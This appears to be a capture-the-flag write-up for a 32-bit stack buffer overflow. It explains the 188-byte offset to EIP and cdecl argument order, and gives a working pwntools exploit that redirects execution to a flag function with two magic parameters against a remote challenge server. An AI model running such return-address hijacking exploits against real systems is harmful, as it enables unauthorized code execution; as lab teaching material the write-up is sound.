![alt text](https://i.imgur.com/Xr16qc7.png)


## Bufferoverflow
- 188 bytes until EIP control


---

# Vuln Function
![alt text](https://i.imgur.com/mKttOHO.png)


# Flag Function
![alt text](https://i.imgur.com/1g7Pk9x.png)

```
- flag(int param_1, int param_2)
	- cdecl is the calling convention
```

![alt text](https://i.imgur.com/HLCtmkd.png)

# Vuln function
![alt text](https://i.imgur.com/nSL5IJ7.png)



# Exploit Development 
```python
from pwn import *  
  
  
context.binary = ELF("./vuln", checksec=True)  
  
#p = process()  
p = remote("188.166.173.108", 32149)  
  
  
payload = b"A"*188              # padding  
payload += p32(0x080491e2)      # vuln function  
payload += b"fooo"              # dummy return addr  
payload += b"\xef\xbe\xad\xde\x0d\xd0\xde\xc0" # param_1 & param_2  


# debug payload
with open("payload.txt", "w") as file:  
       file.write(str(payload))  
       file.close()  
  
p.sendline(payload)  
p.interactive()
```

```
The calling convention of the function we call @ 0x080491e2 needs to be supplied in reverse order followed by an address that will populate the EIP register. In this case, this address will work as a returning address, without supplying one.
```
